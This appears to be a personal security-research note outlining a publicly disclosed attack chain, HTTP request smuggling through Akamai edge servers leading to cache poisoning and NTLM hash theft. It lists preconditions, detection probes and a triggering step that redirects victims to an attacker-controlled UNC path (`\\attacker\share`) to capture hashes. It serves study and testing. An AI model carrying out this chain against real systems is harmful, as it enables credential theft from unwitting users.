---
title: Akamai edge HTTP request smuggling → cache poison → NTLM
slug: akamai-edge-smuggling
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/server-side, technique/request-smuggling]
inbound: []
---

# Akamai edge smuggling → NTLM theft

PortSwigger Top 10 2023 #8.

## Pattern
HTTP request smuggling through Akamai edge servers themselves (not just
customers behind them). ~25% of global Akamai caches initially poisonable
on disclosure; ~75% F5 BIG-IP behind Akamai vulnerable. Pivoted to
NTLM-over-HTTP Office365-style off-flow: smuggled redirects sent NTLM
hashes back to attacker `responder`.

## Preconditions
- Target sits behind Akamai edge.
- F5 BIG-IP or other Office365-style backend on the way.

## Detection
- Use PortSwigger's smuggle/desync probes.
- Test cache-poisoning vector first (lower risk).

## Triggering
Smuggle a request that 30x-redirects to `\\attacker\share` UNC path
embedded in subsequent Office365 auth flow → Windows fetches UNC → NTLM
hash to attacker.

## Related
- [[hop-by-hop-smuggling]]
- [[smtp-smuggling]]
- IIS SSRF → NTLM via `\\\\attacker\\C$\\...` (Ep 52).
- [[multi-a-dns-rebind]] for adjacent SSRF surface.

## Seen in the wild
- PortSwigger Top 10 2023.
- Critical Thinking Podcast Ep 60.

## References
- portswigger.net/research/top-10-web-hacking-techniques-of-2023
- Critical Thinking Podcast Ep 60
